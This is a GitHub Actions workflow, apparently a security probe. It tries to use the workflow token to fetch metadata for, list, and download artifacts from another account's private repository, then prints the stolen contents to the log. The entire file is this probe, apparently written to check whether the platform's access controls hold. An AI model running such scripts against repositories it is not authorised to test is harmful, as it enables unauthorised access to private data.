name: Cross-Repo Artifact Test
on: workflow_dispatch
jobs:
  steal:
    runs-on: ubuntu-latest
    permissions:
      actions: read
    steps:
      - name: Try to access private-target artifacts
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "=== Attempt 1: Get artifact metadata ==="
          curl -s -H "Authorization: Bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/e0X1337/private-target/actions/artifacts/8674075087"

          echo ""
          echo "=== Attempt 2: Download artifact zip ==="
          HTTP_CODE=$(curl -s -o /tmp/stolen.zip -w "%{http_code}" -L \
            -H "Authorization: Bearer $GH_TOKEN" \
            "https://api.github.com/repos/e0X1337/private-target/actions/artifacts/8674075087/zip")
          echo "HTTP status: $HTTP_CODE"
          if [ -f /tmp/stolen.zip ] && [ $(stat -f%z /tmp/stolen.zip 2>/dev/null || stat -c%s /tmp/stolen.zip 2>/dev/null) -gt 0 ]; then
            echo "VULNERABILITY: Downloaded artifact from private repo!"
            unzip -p /tmp/stolen.zip
          else
            echo "Access denied (expected)"
          fi

          echo ""
          echo "=== Attempt 3: List all artifacts in private repo ==="
          curl -s -H "Authorization: Bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/e0X1337/private-target/actions/artifacts"
